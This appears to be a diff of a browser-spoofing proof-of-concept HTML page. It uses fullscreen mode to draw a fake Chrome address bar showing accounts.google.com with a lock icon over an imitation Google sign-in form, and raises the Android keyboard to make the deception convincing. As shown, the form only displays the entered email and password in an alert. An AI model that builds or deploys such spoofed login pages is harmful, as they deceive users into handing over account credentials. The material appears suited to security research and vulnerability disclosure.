@@ -1,98 +1,179 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Show Fake URL Above Keyboard</title>
-<style>
-  body {
-    margin: 0;
-    font-family: Arial, sans-serif;
-    height: 100vh;
-    display: flex;
-    flex-direction: column;
-  }
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>Sign in – Google Accounts</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background-color: white;
+      font-family: Roboto, sans-serif;
+      height: 100%;
+      overflow: hidden;
+    }
 
-  header {
-    padding: 16px;
-    background: #fff;
-    border-bottom: 1px solid #ddd;
-  }
+    #signinPage {
+      display: none;
+    }
 
-  input[type="text"] {
-    width: 100%;
-    padding: 12px;
-    font-size: 16px;
-    border: 1px solid #ccc;
-    border-radius: 8px;
-    box-sizing: border-box;
-  }
+    #googleBtn {
+      margin-top: 40%;
+      text-align: center;
+    }
 
-  main {
-    flex: 1;
-  }
+    .google-btn {
+      background-color: #fff;
+      border: 1px solid #dcdcdc;
+      border-radius: 5px;
+      padding: 12px 24px;
+      font-size: 16px;
+      color: #444;
+      display: inline-flex;
+      align-items: center;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      cursor: pointer;
+    }
 
-  .fake-bar {
-    text-align: center;
-    background: #fff7f0;
-    border-top: 1px solid #e0cbb0;
-    border-bottom: 1px solid #e0cbb0;
-    color: #222;
-    font-size: 18px;
-    padding: 8px 0;
-    position: fixed;
-    width: 100%;
-    z-index: 9999;
-    opacity: 0;
-    visibility: hidden;
-    transition: opacity 0.3s ease, visibility 0.3s ease, bottom 0.2s ease;
-  }
+    .google-btn img {
+      height: 20px;
+      margin-right: 10px;
+    }
 
-  .show {
-    opacity: 1;
-    visibility: visible;
-  }
-</style>
+    #fakeAddressBar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 36px;
+      background: white;
+      border-bottom: 1px solid #dcdcdc;
+      display: flex;
+      align-items: center;
+      padding-left: 10px;
+      font-size: 13px;
+      color: #202124;
+      z-index: 10000;
+      font-family: Arial, sans-serif;
+    }
+
+    #lock {
+      width: 14px;
+      height: 14px;
+      margin-right: 6px;
+    }
+
+    #topbar {
+      margin-top: 36px;
+      height: 56px;
+      width: 100%;
+      background-color: #fff;
+      border-bottom: 1px solid #e0e0e0;
+      display: flex;
+      align-items: center;
+      padding: 0 16px;
+      box-sizing: border-box;
+      z-index: 9999;
+    }
+
+    #topbar img {
+      height: 24px;
+      margin-right: 12px;
+    }
+
+    #topbar span {
+      font-size: 16px;
+      color: #202124;
+      font-weight: 500;
+    }
+
+    #form-wrapper {
+      margin-top: 80px;
+      padding: 24px;
+      text-align: center;
+    }
+
+    input {
+      font-size: 18px;
+      width: 90%;
+      padding: 10px;
+      margin: 10px auto;
+      display: block;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #1a73e8;
+      color: white;
+      font-size: 16px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 4px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+
+    #keyboardTrigger {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      display: none;
+      z-index: 9999;
+    }
+
+    #keyboardTrigger input {
+      font-size: 18px;
+      width: 100%;
+      padding: 10px;
+      border: none;
+    }
+  </style>
 </head>
 <body>
 
-<header>
-  <input type="text" placeholder="Type something..." />
-</header>
+<!-- Step 1: Google Sign-In Button -->
+<div id="googleBtn">
+  <div class="google-btn" id="startSpoof">
+    <img src="https://developers.google.com/identity/images/g-logo.png" alt="G">
+    <span>Sign in with Google</span>
+  </div>
+</div>
 
-<main></main>
+<!-- Step 2: Spoofed Fullscreen UI -->
+<div id="signinPage">
+  <div id="fakeAddressBar">
+    <img id="lock" src="https://www.gstatic.com/images/icons/material/system/1x/lock_black_18dp.png" alt="lock">
+    <span>https://accounts.google.com</span>
+  </div>
 
-<div class="fake-bar" id="fakeBar">google.com</div>
+  <div id="topbar">
+    <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="G">
+    <span>Sign in - Google Accounts</span>
+  </div>
+
+  <div id="form-wrapper">
+    <h2>Sign in</h2>
+    <input type="text" placeholder="Email or phone" id="email">
+    <input type="password" placeholder="Enter your password" id="password">
+    <button onclick="alert('Captured:\n' + email.value + '\n' + password.value)">Next</button>
+  </div>
+
+  <div id="keyboardTrigger">
+    <input type="text" id="fakeInput" placeholder="Trigger Keyboard">
+  </div>
+</div>
 
 <script>
-const fakeBar = document.getElementById('fakeBar');
-let shown = false;
-
-function showFakeBar() {
-  if (!shown) {
-    fakeBar.classList.add('show');
-    shown = true;
-  }
-}
-
-function adjustFakeBar() {
-  const vv = window.visualViewport;
-  if (vv) {
-    // Position bar just above the keyboard
-    fakeBar.style.bottom = `${window.innerHeight - vv.height}px`;
-  } else {
-    fakeBar.style.bottom = '0';
-  }
-}
-
-// Show fake bar on rotation
-window.addEventListener('orientationchange', () => {
-  showFakeBar();
-  adjustFakeBar();
-});
-
-// Adjust bar whenever keyboard opens/closes
-window.visualViewport?.addEventListener('resize', adjustFakeBar);
+  document.getElementById("startSpoof").addEventListener("click", function () {
+    document.documentElement.requestFullscreen().then(() => {
+      document.getElementById("googleBtn").style.display = "none";
+      document.getElementById("signinPage").style.display = "block";
+      setTimeout(() => {
+        document.getElementById("keyboardTrigger").style.display = "block";
+        document.getElementById("fakeInput").focus(); // Triggers Android keyboard
+      }, 300);
+    });
+  });
 </script>
 
 </body>
